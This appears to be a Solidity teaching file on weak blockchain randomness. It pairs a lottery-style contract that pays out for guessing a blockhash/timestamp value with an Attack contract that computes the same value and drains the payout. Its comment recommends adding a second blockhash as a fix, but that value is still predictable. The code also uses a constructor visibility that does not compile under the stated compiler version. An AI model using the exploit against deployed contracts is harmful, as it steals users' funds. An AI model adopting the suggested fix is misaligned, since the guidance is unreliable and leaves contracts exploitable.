// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// In this we get to know how the bloack hash and the block timestamp is not a good way for randomness because data is stored in the one block of the blockchain so it is easy to guess the data
contract GuessTheRandomNumber{
    constructor() public payable {}

    function guess(uint _guess) public{
        uint answer=uint(keccak256(abi.encodePacked(blockhash(block.number-1),block.timestamp)));
        if(_guess==answer){
            (bool sent,)=msg.sender.call{value:1 ether}("");
            require(sent,"Failed to send ether");
        }
    }
}

// so in order to increase randomness instead of using uint answer=uint(keccak256(abi.encodePacked(blockhash(block.number-1),block.timestamp)));
// we can use uint answer=uint(keccak256(abi.encodePacked(blockhash(block.number-1),blockhash(block.number-2),block.timestamp)));

contract Attack{
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public{
        uint answer=uint(keccak256(abi.encodePacked(blockhash(block.number-1),block.timestamp)));

        guessTheRandomNumber.guess(answer);
    }

    function getBalance() public view returns (uint256){
        return address(this).balance;
    }
}